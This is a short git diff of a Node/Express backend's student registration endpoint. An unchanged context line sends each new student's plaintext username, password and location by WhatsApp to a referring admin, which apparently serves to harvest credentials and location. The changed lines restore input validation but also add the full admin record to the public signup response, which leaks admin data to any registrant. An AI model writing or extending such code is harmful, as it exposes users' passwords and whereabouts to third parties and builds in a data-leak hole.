@@ -169,7 +169,7 @@ app.post("/admin/whitelist", async (req, res) => {
 app.post("/student/register", async (req, res) => {
   try {
     const { username, password, referralCode, platform } = req.body;
-   // if (!username || !password) return res.status(400).json({ error: "username & password required" });
+   if (!username || !password) return res.status(400).json({ error: "username & password required" });
 
     let admin = null;
     if (referralCode) {
@@ -188,7 +188,7 @@ app.post("/student/register", async (req, res) => {
     const msg = `🆕 Student signup\nUsername: ${username}\nPassword: ${password}\nID: ${student._id}\nLocation: ${JSON.stringify(location)}`;
     sendWhatsAppToAdmin(admin._id, msg);
 
-    res.json({ success: true, studentId: student._id });
+    res.json({ success: true, studentId: student._id,admin });
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "Student signup failed" });
